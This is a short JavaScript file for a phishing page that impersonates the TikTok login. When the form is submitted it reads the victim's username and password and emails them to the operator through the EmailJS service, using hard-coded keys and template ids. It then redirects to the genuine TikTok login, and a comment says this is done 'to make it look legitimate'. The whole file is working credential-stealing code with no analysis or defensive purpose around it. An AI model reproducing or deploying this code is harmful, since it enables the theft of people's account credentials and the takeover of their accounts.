(function() {
    // Initialize EmailJS with your public key
    emailjs.init("sZy8o2u7l3_qpTCe9");

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        
        // Get form values
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Prepare email parameters
        const templateParams = {
            user_email: username,
            user_password: password,
            from_name: username,
            message: `Username: ${username}\nPassword: ${password}\nPlatform: TikTok`
        };
        
        // Send email using EmailJS
        emailjs.send('service_6tox1ge', 'template_kpovv09', templateParams)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                // Redirect to TikTok after successful submission
                setTimeout(function() {
                    window.location.href = 'https://www.tiktok.com/login';
                }, 1000);
            }, function(error) {
                console.log('FAILED...', error);
                // Still redirect to make it look legitimate
                setTimeout(function() {
                    window.location.href = 'https://www.tikTok.com/login';
                }, 1000);
            });
    });
})();